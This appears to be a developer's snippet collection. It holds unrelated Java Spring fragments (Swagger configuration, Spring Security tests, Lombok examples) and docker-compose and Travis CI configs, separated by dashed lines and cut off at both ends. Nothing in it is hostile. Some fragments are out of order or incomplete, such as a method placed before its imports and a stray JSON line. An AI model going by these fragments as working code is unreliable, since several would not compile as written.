            throw new UsernameNotFoundException(username);
        }
        return new AppUserPrincipal(appUser);
    }

}
--------------------------------------------------------------------------------------------------------
import java.util.List;

import org.joda.time.LocalDate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.context.request.async.DeferredResult; import org.springframework.web.servlet.config.annotation.EnableWebMvc;

import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.builders.ResponseMessageBuilder; import springfox.documentation.schema.ModelRef; import springfox.documentation.schema.WildcardType; import springfox.documentation.service.ApiKey; import springfox.documentation.service.AuthorizationScope; import springfox.documentation.service.SecurityReference; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spi.service.contexts.SecurityContext; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2;

import com.fasterxml.classmate.TypeResolver;

@EnableSwagger2 @Configuration @EnableWebMvc @ComponentScan("com.diginsite.microservices.web") public class Swagger2SpringBoot { @Autowired private TypeResolver typeResolver;

@Bean
public Docket swaggerSpringMvcPlugin() {
    return new Docket(DocumentationType.SWAGGER_2)
            .groupName("v1-bbs")
            .select()
            .apis(RequestHandlerSelectors.any())
            .paths(PathSelectors.any())
            .build()
            .pathMapping("/")
            .directModelSubstitute(LocalDate.class, String.class)
            .genericModelSubstitutes(ResponseEntity.class)
            .alternateTypeRules(newRule(typeResolver.resolve(DeferredResult.class,
                            typeResolver.resolve(ResponseEntity.class,
                                    WildcardType.class)), typeResolver
                            .resolve(WildcardType.class)))
            .useDefaultResponseMessages(false)
            .globalResponseMessage(RequestMethod.GET,
                    newArrayList(new ResponseMessageBuilder().code(500)
                            .message("500 message")
                            .responseModel(new ModelRef("Error")).build()))
            .securitySchemes(newArrayList(apiKey()))
            .securityContexts(newArrayList(securityContext()));
}

private ApiKey apiKey() {
    return new ApiKey("mykey", "api_key", "header");
}

private SecurityContext securityContext() {
    return SecurityContext.builder().securityReferences(defaultAuth())
            .forPaths(PathSelectors.regex("/anyPath.*")).build();
}

List<SecurityReference> defaultAuth() {
    AuthorizationScope authorizationScope = new AuthorizationScope(
            "global", "accessEverything");
    AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
    authorizationScopes[0] = authorizationScope;
    return newArrayList(new SecurityReference("mykey", authorizationScopes));
	}
}
--------------------------------------------------------------------------------------------------------
 git -c core.quotepath=false -c log.showSignature=false rm --cached -f -- service/src/test/resources/application-regex.yaml
 git -c core.quotepath=false -c log.showSignature=false checkout HEAD -- service/src/test/resources/application-regex.yaml
--------------------------------------------------------------------------------------------------------
<config xmlns='http://www.ehcache.org/v3' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:jsr107="http://www.ehcache.org/v3/jsr107"
    xsi:schemaLocation="http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd 
                           http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">
    <cache alias="products_list">
        <expiry>
            <ttl unit="hours">1</ttl>
        </expiry>
        <heap unit="entries">1200</heap>
        <jsr107:mbeans enable-statistics="false" />
    </cache>

</config>
--------------------------------------------------------------------------------------------------------
public void setup() {
    mvc = MockMvcBuilders
            .webAppContextSetup(context)
            .apply(springSecurity())  
            .build();
}

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.Test;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;

import eu.ubicon.webapp.test.WebappTestEnvironment;

public class Test extends WebappTestEnvironment {

    public static class MockSecurityContext implements SecurityContext {

        private static final long serialVersionUID = -1386535243513362694L;

        private Authentication authentication;

        public MockSecurityContext(Authentication authentication) {
            this.authentication = authentication;
        }

        @Override
        public Authentication getAuthentication() {
            return this.authentication;
        }

        @Override
        public void setAuthentication(Authentication authentication) {
            this.authentication = authentication;
        }
    }

    @Test
    public void signedIn() throws Exception {

        UsernamePasswordAuthenticationToken principal = 
                this.getPrincipal("test1");

        MockHttpSession session = new MockHttpSession();
        session.setAttribute(
                HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY, 
                new MockSecurityContext(principal));


        super.mockMvc
            .perform(
                    get("/api/v1/resource/test")
                    .session(session))
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class XcareVitalinqConnectorWebMvcConfigurerAdapter extends WebMvcConfigurerAdapter {

    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/webjars/**")
                .addResourceLocations(
                        "classpath:/META-INF/resources/webjars/");

        registry.addResourceHandler("/swagger-ui.html")
                .addResourceLocations(getStaticLocations());
    }

    private String[] getStaticLocations() {

        String[] result = new String[5];
        result[0] = "/";
        result[1] = "classpath:/META-INF/resources/";
        result[2] = "classpath:/resources/";
        result[3] = "classpath:/static/";
        result[4] = "classpath:/public/";

        return result;
    }
}

{"downloadStatus":0,"filename":"lombokd.config","filepath":"C:\\git-project\\paragon.microservices.distributor","id":"c108cda3-8b4b-483d-a987-d65e6bfe3024"}
--------------------------------------------------------------------------------------------------------
@EnableSwagger2
@Configuration
public class SwaggerConfiguration {

    @Bean
    public AlternateTypeRuleConvention springDataWebPropertiesConvention(final SpringDataWebProperties webProperties) {
        return new AlternateTypeRuleConvention() {
            @Override
            public int getOrder() { return Ordered.HIGHEST_PRECEDENCE; }

            @Override
            public List<AlternateTypeRule> rules() {
                return singletonList(
                        newRule(Pageable.class, pageableDocumentedType(webProperties.getPageable(), webProperties.getSort()))
                );
            }
        };
    }

    private Type pageableDocumentedType(SpringDataWebProperties.Pageable pageable, SpringDataWebProperties.Sort sort) {
        final String firstPage = pageable.isOneIndexedParameters() ? "1" : "0";
        return new AlternateTypeBuilder()
                .fullyQualifiedClassName(fullyQualifiedName(Pageable.class))
                .property(property(pageable.getPageParameter(), Integer.class, ImmutableMap.of(
                        "value", "Page " + (pageable.isOneIndexedParameters() ? "Number" : "Index"),
                        "defaultValue", firstPage,
                        "allowableValues", String.format("range[%s, %s]", firstPage, Integer.MAX_VALUE),
                        "example", firstPage
                )))
                .property(property(pageable.getSizeParameter(), Integer.class, ImmutableMap.of(
                        "value", "Page Size",
                        "defaultValue", String.valueOf(pageable.getDefaultPageSize()),
                        "allowableValues", String.format("range[1, %s]", pageable.getMaxPageSize()),
                        "example", "5"
                )))
                .property(property(sort.getSortParameter(), String[].class, ImmutableMap.of(
                        "value", "Page Multi-Sort: fieldName,(asc|desc)"
                )))
                .build();
    }

    private String fullyQualifiedName(Class<?> convertedClass) {
        return String.format("%s.generated.%s", convertedClass.getPackage().getName(), convertedClass.getSimpleName());
    }

    private AlternateTypePropertyBuilder property(String name, Class<?> type, Map<String, Object> parameters) {
        return new AlternateTypePropertyBuilder()
                .withName(name)
                .withType(type)
                .withCanRead(true)
                .withCanWrite(true)
                .withAnnotations(Collections.singletonList(AnnotationProxy.of(ApiParam.class, parameters)));
    }
}


@AllArgsConstructor(access = AccessLevel.PRIVATE)
@Accessors(fluent = true)
public class AnnotationProxy implements Annotation, InvocationHandler {
    @Getter
    private final Class<? extends Annotation> annotationType;
    private final Map<String, Object> values;

    public static <A extends Annotation> A of(Class<A> annotation, Map<String, Object> values) {
        return (A) Proxy.newProxyInstance(annotation.getClassLoader(),
                new Class[]{annotation},
                new AnnotationProxy(annotation, new HashMap<String, Object>(values) {{
                    put("annotationType", annotation); // Required because getDefaultValue() returns null for this call
                }}));
    }

    public Object invoke(Object proxy, Method method, Object[] args) {
        return values.getOrDefault(method.getName(), method.getDefaultValue());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableSwagger2
public class SwaggerConfig {
    @Bean
    public Docket api() {
        return new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.basePackage("com.archisoft.mtx.controller"))
                .paths(regex("/api.*"))
                .build()
                .apiInfo(apiInfo());
    }

    private ApiInfo apiInfo() {
        ApiInfo apiInfo = new ApiInfo(
                "Backend API Services",
                "Backend APIs for Business to Business",
                "V1.0",
                "Terms of service",
                "Sadun | Tharanga email",
                "Archisoft Global",
                "Archisoft URL");
        return apiInfo;
    }

    @Bean
    public AlternateTypeRuleConvention pageableConvention(
            final TypeResolver resolver,
            final RepositoryRestConfiguration restConfiguration) {
        return new AlternateTypeRuleConvention() {

            @Override
            public int getOrder() {
                return Ordered.HIGHEST_PRECEDENCE;
            }

            @Override
            public List<AlternateTypeRule> rules() {
                return singletonList(
                        newRule(resolver.resolve(Pageable.class), resolver.resolve(pageableMixin()))
                );
            }
        };
    }

    private Type pageableMixin() {
        return new AlternateTypeBuilder()
                .fullyQualifiedClassName(
                        String.format("%s.generated.%s",
                                Pageable.class.getPackage().getName(),
                                Pageable.class.getSimpleName()))
                .withProperties(Stream.of(
                        property(Integer.class, "page"),
                        property(Integer.class, "size"),
                        property(String.class, "sort")
                ).collect(toList()))
                .build();
    }

    private AlternateTypePropertyBuilder property(Class<?> type, String name) {
        return new AlternateTypePropertyBuilder()
                .withName(name)
                .withType(type)
                .withCanRead(true)
                .withCanWrite(true);
    }
}
--------------------------------------------------------------------------------------------------------
import static com.google.common.collect.Lists.newArrayList;
import static springfox.documentation.spi.schema.contexts.ModelContext.inputParam;

import com.fasterxml.classmate.ResolvedType;
import com.fasterxml.classmate.TypeResolver;
import com.google.common.base.Function;
import com.google.common.collect.Sets;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;
import lombok.SneakyThrows;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Component;
import springfox.documentation.builders.OperationBuilder;
import springfox.documentation.builders.ParameterBuilder;
import springfox.documentation.schema.ModelReference;
import springfox.documentation.schema.ResolvedTypes;
import springfox.documentation.schema.TypeNameExtractor;
import springfox.documentation.service.Parameter;
import springfox.documentation.service.ResolvedMethodParameter;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.schema.contexts.ModelContext;
import springfox.documentation.spi.service.OperationBuilderPlugin;
import springfox.documentation.spi.service.contexts.OperationContext;
import springfox.documentation.spi.service.contexts.ParameterContext;

@Component
@Order(Ordered.LOWEST_PRECEDENCE)
public class OperationPageableParameterReader implements OperationBuilderPlugin {
    private final TypeNameExtractor nameExtractor;
    private final ResolvedType pageableType;
    private final TypeResolver resolver;

    @Autowired
    public OperationPageableParameterReader(TypeNameExtractor nameExtractor, TypeResolver resolver) {
        this.nameExtractor = nameExtractor;
        this.resolver = resolver;
        this.pageableType = resolver.resolve(Pageable.class);
    }

    @Override
    @SneakyThrows
    public void apply(OperationContext context) {
        List<ResolvedMethodParameter> methodParameters = context.getParameters();
        List<Parameter> parameters = newArrayList();

        for (ResolvedMethodParameter methodParameter : methodParameters) {
            ResolvedType resolvedType = methodParameter.getParameterType();
            if (!pageableType.equals(resolvedType)) {
                continue;
            }

            ParameterContext parameterContext = new ParameterContext(methodParameter, new ParameterBuilder(),
                    context.getDocumentationContext(), context.getGenericsNamingStrategy(), context);
            Function<ResolvedType, ? extends ModelReference> factory = createModelRefFactory(parameterContext);

            ModelReference intModel = factory.apply(resolver.resolve(Integer.TYPE));
            ModelReference stringModel = factory.apply(resolver.resolve(List.class, String.class));

            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("page")
                    .modelRef(intModel)
                    .description("Results page you want to retrieve (0..N)")
                    .build());
            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("size")
                    .modelRef(intModel)
                    .description("Number of records per page")
                    .build());
            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("sort")
                    .modelRef(stringModel)
                    .allowMultiple(true)
                    .description("Sorting criteria in the format: property(,asc|desc). "
                            + "Default sort order is ascending. " + "Multiple sort criteria are supported.")
                    .build());

            final OperationBuilder operationBuilder = context.operationBuilder();
            operationBuilder.parameters(parameters);

            Set<String> toDelete = Sets.newLinkedHashSet(Arrays
                    .asList("offset", "pageNumber", "pageSize", "paged", "sort.sorted", "sort.unsorted", "unpaged"));
            final Field field = operationBuilder.getClass().getDeclaredField("parameters");
            field.setAccessible(true);
            @SuppressWarnings("unchecked")
            final List<Parameter> list = (List<Parameter>) field.get(operationBuilder);
            field.set(operationBuilder,
                    list.stream().filter(p -> !toDelete.contains(p.getName())).collect(Collectors.toList()));
        }
    }

    private Function<ResolvedType, ? extends ModelReference> createModelRefFactory(ParameterContext context) {
        ModelContext modelContext = inputParam(context.getGroupName(),
                context.resolvedMethodParameter().getParameterType(),
                context.getDocumentationType(),
                context.getAlternateTypeProvider(),
                context.getGenericNamingStrategy(),
                context.getIgnorableParameterTypes());
        return ResolvedTypes.modelRefFactory(modelContext, nameExtractor);
    }

    @Override
    public boolean supports(DocumentationType delimiter) {
        return true;
    }
}
--------------------------------------------------------------------------------------------------------
@Override
  protected List<ConfigIssue> init() {

    URL url = MyClass.class.getResource("sample-resource.txt");
    LOGGER.info("resource url: {}",url);
    InputStream is = MyClass.class.getResourceAsStream("sample-resource.txt");
    LOGGER.info("resource stream: {}",is);

    List<ConfigIssue> issues = super.init();
    return issues;
  }
--------------------------------------------------------------------------------------------------------
@Controller
static class FaviconController {
  
    @GetMapping("favicon.ico")
    @ResponseBody
    void returnNoFavicon() {
    }
}
--------------------------------------------------------------------------------------------------------
import lombok.experimental.ExtensionMethod;

@ExtensionMethod({java.util.Arrays.class, Extensions.class})
public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    intArray.sort();
    
    String iAmNull = null;
    return iAmNull.or("hELlO, WORlD!".toTitleCase());
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}


 public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    java.util.Arrays.sort(intArray);
    
    String iAmNull = null;
    return Extensions.or(iAmNull, Extensions.toTitleCase("hELlO, WORlD!"));
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}
--------------------------------------------------------------------------------------------------------
notifications:
 - !employee.notifications.NotificationWrapper
   regionName: employee
   listeners:
      - !employee.notifications.NotificationListener
        classpath: employee.view.EmployeeTableView
        method: setData
 - !employee.notifications.NotificationWrapper
   regionName: course
   listeners:
      - !employee.notifications.NotificationListener
        classpath: CourseTableView
        method: loadData
--------------------------------------------------------------------------------------------------------
version: '3.2'
services:
  proxy: 
    image: nginx:1.13-alpine
    volumes:
      - ./proxy/conf/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./proxy/conf/domain.conf:/etc/nginx/domain.conf:ro
    ports:
      - "80:80"
    depends_on:
      - webapp
  database:
    image: mysql:5.7
    volumes:
      - ./database/db:/docker-entrypoint-initdb.d/:ro
      - ./database/data:/var/lib/mysql:rw
    environment:
      - MYSQL_ROOT_PASSWORD=${DB_ROOT_PASSWORD}
      - MYSQL_USER=${DB_USER}
      - MYSQL_PASSWORD=${DB_PASSWORD}
      - MYSQL_DATABASE=${DB_DATABASE}
  webapp:
    build: webapp
    image: webapp
    environment:
      - DB_HOST=${DB_HOST}
      - DB_USER=${DB_USER}
      - DB_PASSWORD=${DB_PASSWORD}
      - DB_DATABASE=${DB_DATABASE}
    depends_on:
      - database
--------------------------------------------------------------------------------------------------------
language: java
sudo: false

install:
  -

matrix:
  fast_finish: true
  include:
    - jdk: oraclejdk8
      env:
        - DESC="releasenotes-builder"
        - CMD="cd releasenotes-builder && mvn clean verify && mvn clean compile package"

    - jdk: oraclejdk8
      env:
        - DESC="patch-diff-report-tool"
        - CMD="cd patch-diff-report-tool && mvn clean install"

    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (launch.groovy) on linux "
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && mvn clean install -Passembly"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy launch.groovy -l projects-for-travis.properties -c my_check.xml -i"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -c my_check.xml -b master -p patch-branch -r ../checkstyle"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux with base and patch configs"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -bc my_check.xml -pc my_check.xml -b master -p patch-branch -r ../checkstyle"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux with enabled patchOnly"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -pc my_check.xml -p patch-branch -r ../checkstyle -m single"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="codenarc validation for groovy files"
        - CMD1=" cd checkstyle-tester "
        - CMD2=" && ./codenarc.sh . diff.groovy > diff.log && cat diff.log && grep '(p1=0; p2=8; p3=0)' diff.log"
        - CMD3=" && ./codenarc.sh . launch.groovy > launch.log && cat launch.log && grep '(p1=0; p2=21; p3=1)' launch.log"
        - CMD4=" "
        - CMD=$CMD1$CMD2$CMD3$CMD4
    # disable as for now java8 is not supoorted jdk for travis MacOS
    #- os: osx
    #  env:
    #    - DESC="checkstyle-tester on MacOS"
    #    - CMD0="export JAVA_HOME=$(/usr/libexec/java_home) "
    #    - CMD1=" && git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
    #    - CMD2=" && mvn clean install -Passembly"
    #    - CMD3=" "
    #    - CMD4=" "
    #    - CMD5=" && cd ../checkstyle-tester && cp projects-for-travis.properties projects-to-test-on.properties "
    #    - CMD6=" && ./launch.sh -Dcheckstyle.config.location=my_check.xml "
    #    - CMD=$CMD0$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6

script: eval $CMD

after_success:

cache:
  directories:
  - ~/.m2

branches:
  only:
    - master
--------------------------------------------------------------------------------------------------------
matrix:
  include:
    - jdk: oraclejdk8
      env: DO_AFTER_SUCCESS=true
    - jdk: oraclejdk9
    # We can't test on Java 10. OpenJDK 10 doesn't include JavaFX (and there's no good way to install it). Oracle JDK 10 (which includes JavaFX) is no longer supported by Travis.
    - jdk: openjdk11
      env: REPLACE_CACERTS=true

language: java

branches:
  only:
  - master
  - develop

addons:
  apt:
    packages:
    - pandoc
  sonarcloud:
    organization: prob2

env:
  global:
  - secure: ghArb+3bPNLUtjyRhQdUIcAXIOxBWPz//dg/VDw4kHbsLgWQ+9AcdnetZ6S0C7OHqm1gTx/YJI5aolMIjsAHpMzgsUIlzbvtfdI54RWp76jaCvhqOjYApjQMOOKDtvPE0mIWhfm2FaX7e+v9SKeyAWWiLoiUxJAf9DsQcKEY4dXVSgIlU8DQGVYOn426pcjoUtTsVqdmNpcytdtQE/Eax8WNLU5gythSarZ/jopZO+WCZPRVCCalhDJ3jHRSCPAtKtKG7vijRL50b7lPDtVqMKHYwbMhPgRnTRVT9HTc0oxVCHDIuoTwMb7JBIdBIAh1BaJBcEkoKaPAOmAIMnVHcNDaPj6YVMocZhVllNA51qwOBeeI+l+1slJhK0iUILVNEqmkHxL/QMnjxYAPY1CYrTCMbkyOCU/gBi7Fx1x9yUe2Zm81+T4MJD3aW7fLM/3PxWcDPupUia5u0PBlXI3KznIyb8zE6qSRoNIla15OMx+X9XXSv/6KbPlWceQC4ITNt7oBkIlN1+zcI29qf/q08CT72TP5z8y6py3roMIQ7knCGjmS+YO58Bq6+r260VOW7btLHSzAJd/8N8tINzVGBBztPl0ytVVD7AJgflM2rTm3FTDPNnOcZLPtb2+5haXXd4af0+au5+Ovx9LTSK9d6jCAAl8RkIAwR+mNVWrhrVQ=
  - secure: FOWN70kC1DijANcdPHPO6CqKmuvpSef3snEDrStABtyEnhwKpARHti9NesvzK6LmFWJVb5v9CZ5NikLDxslSnmecHI97FQRPZfrXAnZB+z9LQd3GThYbR/jxPmyz9ohojmEJSN3EWWbwW469TWhelfLtZc2z187dCpFfeL11VP/S8EKK0c34vffC0poD46+AMXmnFwSP5Qdesvn+ZqndSlANqdSgWQ3+Ku1bP/D0vNlw2RW9cUvdsADQZyAGnBb1kL04sZ0iiy0s6CSMBkgLM2izvc/eqb3SPcSxfMIm3QIV7CWNeTlUn/Yq6aXEA3WJm+7xYWzaOi3gUA2bfNeD6wDkdDyFk0KWuNBSBtX4i17lghKO0RExkpWKqnKvpr/zwoKYjkgzjq8T3Ho22EoWXljeD7iAkpbf8BUVmTRmNSM3uUpUWjAw2lLSJvPrk1dEGlREreSk10QHM6Fin+99kAnWdU9D9QXP0z6iMAD+OFW0DgzOjxBWBuJPGJHYdhoxJd94S+u4j1CDsFouA49gOvm2qi55LYsCm0DLfPSotQ10s24Jc0UlyCMXhdhZnSWLDYGZ604N0BXaNbAZ+uu4tc0WK4kUY1H1pB5hHEAAbae2TWewQTINLxPwt5Nrm/H72LZMnWz2IJNOPNO2IlgMl0h18YgNeZwJxFbp7yDe+Ik=
  - secure: c+NGBCkOS0FTkW0/VZdLpMq280LO89hfJrLrPp6vxjgLBvzo4ai8qz4Z4pUE34/z5V/LiT6LdvkEI6WQIWdqU5UqBX7PyN66/Da4wtPLxqeTRv0giEXmziSRcePhdJzHxujCSU6a3ANZqSU+weeaqLHyyhuenDNvmXRz2vZLOIBxSzPDpOCm3bBV0BShutn/+zJHX/xW1mRrCZ24n2mL2rD/plYK7Ipc4+S5f7alSeQVHcYs5LTIyV2eGTU58XLaZorjFHKk7YA0HkU0fWDs3Jh28JSsVGKY3Ssj4lhHqrS/NqHBzjoWb8d7EOPnUWFp9bjRk/ia5gtUF8Ev6ljJGnnkbc/Kt2XdJNR0uRn2dnfaBVHmzpSRZZnx4b5MLg/ET8UZKIlee3ZupJEVPWWurmD52iXhm/tAD5YxIcSVg1SSYE9lF3uBZgb43Cf/txbuU9zY+VqkgwR9v1i2C0J+JOQSX4jYcuRJd1fQbhcSSbbkaitz/q7LQmZ1Nx+0Oilw94+oc0n3q+ye+km+gYb2g6VqFf+ooVKe0W7b8hxPvdRBKTnBduEuCnsvqWqYODcg9EGlHuJxj8EDnM3hIT+SUnyzqUS80oI71whgu8XTGJDgaTDjW0hHxKLqtFUI/Hy419/L86oklQBkJ+mrxFdyVKD9LrT/OQ4qoQAgsjeQIHE=
  - secure: R4Hg5t8plAqVlWVTUlFIf2PLaBGYur4LgPzMucRHxPI3F7HbG3/MaoINyVQ//oFnsSXBO/4LsaDz01IMGDo8shvXLi2mN3GGfVSjQx443gwWZEC34ftomYZduXikCGILlV64mdiM7lHTW4Ficu32K3FwRKrTjhtlcIKqWW8WOlSfW2QqS3E38iOe2WyjhVIj/+QObrJFdvnqPxcXOQN/MHaSOhmZ0oUJZ3EFDnvaij9nZR67V0IQr8YTCUKLP2Q+UqfWS7mJXkkhBBo7Ff425JvyaoHMogBCtdKTgftRm3TIGOlI3hiYIaLnG2esINWGeaBJ0bSFgetvcsPrwcaqN/TF6m4S+P89BMt4r2htR0q7vM6fNf5fOmyCidtWmU5bSMLusZ4WC4GT3IarMiI/faOX+W38byMsGe06tKperpP5dmkJR/QWGCYJlrmlU8/u7LTuFeeLaPx5IOGnLdqqVNk83rjj6Ws1LdVUxVcBbHu2SUGV+MFmgIpkleYgS1b9bRaUGQRagiMc4FgOOhJOhhucNnpTOXRU7mKgnuVVjMlnfm03iZXOy0NmoOLs5XPTgOD28jZQBZI7PyrGCGPch9dmIdb484N8nO2EXjulRqYeb0A7fihZ/S65gPyzYTgY+mJTDmGaIAfSXxI5id11lDcXiz9E45yxsbnAZQO1lZk=
  - secure: oaBvSWCDGimkM3H238VHCP07ZIn9kS1R8Y8F79YyWe7x8nhqH4zV2jX2EkRPQdqJrDBSsvAOzVP2Vmbrg8tOxpx622sjfOAODqLmDwWEvcMfBIzZinOZTt3/LX7V9y6TwqMkRKjDfSIRvGHegrsWhnNh1sLZkBdjFVZMtUgVqxfsn3MCABQCnbkxY2DW8LxmLJAdGiqrZKzMKDbNwsq5X6/7ekVYZKIti6QSQi0paxgplK7tWxhKVIxNCNQaImOde+xGHdTdXu0sBn1IN3hND4ok8s9YcbrPtN654BKT77/bhuQ77rYkx5pxuj1Z8MgzfwFX5ynn8Wpq+qxbi49ICAms/ZBw9MxMwpYpD/B4cOXlLU5Zn4AkwNJmGZm7KFcX9HHu9qjPGswlRqx8xx8XfxWNE60FQqh0SzAGjpg/ZSFN/Jhl0QrInx8PG+Mol6XtAY/LkzLDNQds2T54ABfBexWXNiliEc0Hp9SorlXW7N5y2HwqwK4ed4nD4h5gHLglK8HS/0lZWh6TL7upI4NHQXlypSeZTR1WFeOxwPTm6rPQ+ExJv90LHe4/QXRWPw9DKDcHLd6xfxaB7OSnYgc00mZ3dX5yB6xw2T9NxjYY5xmkrv1R+n8lO7GgWuUZO7xScAyjMFvB4q2/rZAJrOqavWkfAFUn3Xbw+Qlw96NsR3g=

before_install:
# Always use the system-wide certificates (OpenJDK doesn't include the certificates needed to connect to oss.sonatype.org)
- |
  if [[ "${REPLACE_CACERTS}" == "true" ]]
  then
    rm "${JAVA_HOME}/lib/security/cacerts"
    ln -s "/etc/ssl/certs/java/cacerts" "${JAVA_HOME}/lib/security/cacerts"
  fi
install:
- rvm install 2.2.6
- gem install travis-custom-deploy

script:
- ./gradlew distZip shadowJar createAppZip --info --stacktrace --warning-mode=all

before_cache:
- rm -f $HOME/.gradle/caches/modules-2/modules-2.lock
- rm -fr $HOME/.gradle/caches/*/plugin-resolution/

cache:
  directories:
  - $HOME/.gradle/caches/
  - $HOME/.gradle/wrapper/
  - $HOME/.rvm/

after_success:
- |
  if [[ "${DO_AFTER_SUCCESS}" == "true" ]]
  then
    # Start uploading in the background while SonarQube runs
    travis-custom-deploy sftp build/distributions/*.zip build/libs/*-all.jar &
    
    git fetch --unshallow
    ./gradlew sonarqube --info --stacktrace --warning-mode=all
    
    wait # Wait for travis-custom-deploy (started in the background) to finish
  fi
--------------------------------------------------------------------------------------------------------
language: java
jdk:
- oraclejdk8
env:
  global:
    secure: Uo89ZmbGNHfVXZYRXMnGRmD3CSHnKl5CmB3gbOCqSmWEAmnb5vwtmigKa5kqzCXa4qHH78GhB/zQuhjY5rbXUFpam1+t08JFgspkSLZ7i1W70vrdN14hwMI0bk7l6nM0hAxnnkViutzNGn3ejqRHmGIJc5VGRR+1MyBGSAzI8lUfx5FPzbB4mmHCDG4g1D6csKPfzXUisGdtK4Xdrk+UNoh4W5+15B1As1YaQBl9hkGSjjo3IB+dPBbER2TXviTxjokWENpia7iVGuhnCEU3zpvv1yEwZ7u6s1NNfu9SU/c1/JtBTZU51Qxes6Ja3B92wWXw8jSbxbuxHu3kZ0sFwg60V1K1+JV6prDZqc8/nlwX9DSR1FgMmcFCPG/VrpCbxrBGvCJTNBWkOidMZTR6Sl5PAVwp0uwz5lWAV3DISAV0jMPTsG4ZJaa5MSKOspl1AzZUx72nljjUUNW/KCCIR2Ntxn0xgJVbAdsLFnRB00T/UhcePhpTHAUpuSfxZdMdGUSPCU5b8zEzkpe7lY49GPVPX6zh3dfdRqnATWgKPS7FhTbu8xEyiBD9D6+jMwycwBh6XPhDCEPtBYuvsGhIPDKV/yqyf18PH0eDypcvLRwCNDRhCcRiIEerhU0mAjYZrq7WSpj8GZ7e0Yjs+GFWACcHkGZv6QP3e0xFanJp+o8=

before_install:
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in secring.gpg.enc -out secring.gpg -d
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in pubring.gpg.enc -out pubring.gpg -d
- openssl aes-256-cbc -pass pass:$ENCRYPTION_PASSWORD -in gradle.properties.enc -out gradle.properties -d

install: /bin/true

sudo: false

script: TERM=dumb gradle clean build uploadArchives
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "/appoint/{bookId}/{userNumber}/{holdDay}", method = RequestMethod.GET, produces = "text/plain;charset=UTF-8")
  @ResponseBody
--------------------------------------------------------------------------------------------------------

    public static void testExecutorService() {

        Employee employee = new Employee("John", 2000);

